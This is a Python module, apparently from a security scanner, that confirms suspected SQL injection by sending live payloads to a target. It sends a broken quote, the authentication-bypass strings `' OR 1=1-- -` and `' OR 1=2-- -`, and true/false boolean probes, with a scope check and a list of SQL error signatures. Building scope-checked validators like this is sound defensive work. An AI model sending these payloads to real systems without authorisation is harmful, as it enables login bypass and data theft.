"""SQLi 确定性验证。

证据来源（任一成立即 CONFIRMED）：
  A. error_based —— 注入单引号破坏语法触发 SQL 错误，平衡（双单引号）后错误消失，
     证明参数进入了 SQL 上下文（抓报错/UNION 型注入点，如 Juice Shop 的 products search）；
  B. auth_bypass —— `' OR 1=1--` 触发认证绕过（返回 token），`' OR 1=2--` 不返回；
  C. boolean_diff —— true/false 条件响应稳定且显著差异。

证据纪律：
  - 绝不把"响应里出现了我的 payload 字符串"当证据（那是回显不是注入）；
  - 不存在性无法由单套 oracle 证明，所以所有 oracle 都没证实时返回 INSUFFICIENT，
    绝不写成 REFUTED——把"我验不出"说成"不存在"会把真漏洞洗白。
"""
from __future__ import annotations

import httpx

from .base import ValidationResult, Validator, Verdict

TRUE_PAYLOAD = "' OR 1=1-- -"
FALSE_PAYLOAD = "' OR 1=2-- -"
TOKEN_MARKERS = ('"authentication"', '"token"', "bearer ")
SQL_ERRORS = (
    "sqlite_error", "sql syntax", "syntax error", "unrecognized token", 'near "',
    "incomplete input", "unterminated", "sqlstate", "ora-0", "postgresql", "psql",
    "mysql", "you have an error in your sql", "quoted string not properly terminated",
)


def _sql_error(text: str) -> bool:
    t = text.lower()
    return any(s in t for s in SQL_ERRORS)


class SqliValidator(Validator):
    vuln_type = "sqli"

    async def _send(self, client: httpx.AsyncClient, finding: dict, value: str) -> dict:
        url = finding["url"]
        method = finding.get("method", "GET").upper()
        param = finding["param"]
        inj = finding.get("injection", "query")
        base = dict(finding.get("base_params", {}))
        base[param] = value
        if inj == "json_body":
            r = await client.request(method, url, json=base)
        elif inj == "form_body":
            r = await client.request(method, url, data=base)
        else:
            r = await client.request(method, url, params=base)
        body = r.text
        return {"status": r.status_code, "len": len(body),
                "has_token": any(m in body.lower() for m in TOKEN_MARKERS),
                "sql_error": _sql_error(body)}

    @staticmethod
    def _same(a: dict, b: dict) -> bool:
        return a["status"] == b["status"] and a["has_token"] == b["has_token"] \
            and abs(a["len"] - b["len"]) <= 32

    async def validate(self, finding: dict, scope, oob) -> ValidationResult:
        url = finding["url"]
        try:
            scope.check(url)
        except Exception as e:  # noqa: BLE001
            return ValidationResult(Verdict.INSUFFICIENT, {"error": f"scope: {e}"})
        param = finding.get("param")
        if not param:
            return ValidationResult(Verdict.INSUFFICIENT, {"error": "缺少 param"})
        base_val = str(finding.get("base_params", {}).get(param, "a"))

        try:
            async with httpx.AsyncClient(timeout=15, follow_redirects=True, verify=False) as c:
                # oracle A：报错型（破语法 vs 平衡）
                rb = await self._send(c, finding, base_val + "'")
                rf = await self._send(c, finding, base_val + "''")
                # oracle B/C：认证绕过 / 布尔差分（各重放一次确认稳定）
                t1 = await self._send(c, finding, TRUE_PAYLOAD)
                f1 = await self._send(c, finding, FALSE_PAYLOAD)
                t2 = await self._send(c, finding, TRUE_PAYLOAD)
                f2 = await self._send(c, finding, FALSE_PAYLOAD)
        except Exception as e:  # noqa: BLE001
            return ValidationResult(Verdict.INSUFFICIENT, {"error": str(e)})

        ev = {"error_probe": {"break": rb, "balanced": rf},
              "bool": {"true": t1, "false": f1, "replay_true": t2, "replay_false": f2}}
        q = f"{finding.get('method', 'GET')} {url} 参数 {param}："

        # 目标不可用（全 5xx）→ 无法验证，诚实返回证据不足
        if all(r["status"] >= 500 for r in (rb, rf, t1, f1, t2, f2)):
            return ValidationResult(Verdict.INSUFFICIENT, ev, "目标返回 5xx，不可用，无法验证")

        # A: error-based
        if rb["sql_error"] and not rf["sql_error"]:
            ev["oracle"] = "error_based"
            return ValidationResult(Verdict.CONFIRMED, ev,
                                    q + f"注入 `{base_val}'` 触发 SQL 错误，`{base_val}''` 平衡后恢复")

        stable = self._same(t1, t2) and self._same(f1, f2)
        # B: auth bypass
        if stable and t1["has_token"] and not f1["has_token"]:
            ev["oracle"] = "auth_bypass"
            return ValidationResult(Verdict.CONFIRMED, ev,
                                    q + f"注入 `{TRUE_PAYLOAD}` 返回认证令牌，`{FALSE_PAYLOAD}` 不返回")
        # C: boolean diff
        if stable and not self._same(t1, f1):
            ev["oracle"] = "boolean_diff"
            return ValidationResult(Verdict.CONFIRMED, ev,
                                    q + f"注入 `{TRUE_PAYLOAD}` vs `{FALSE_PAYLOAD}` 响应稳定差异")

        # 没有任何 oracle 证实 —— 诚实返回 INSUFFICIENT，不写成 REFUTED
        ev["oracle"] = None
        return ValidationResult(Verdict.INSUFFICIENT, ev,
                                "报错/认证绕过/布尔三种 oracle 均未取得确定性证据")
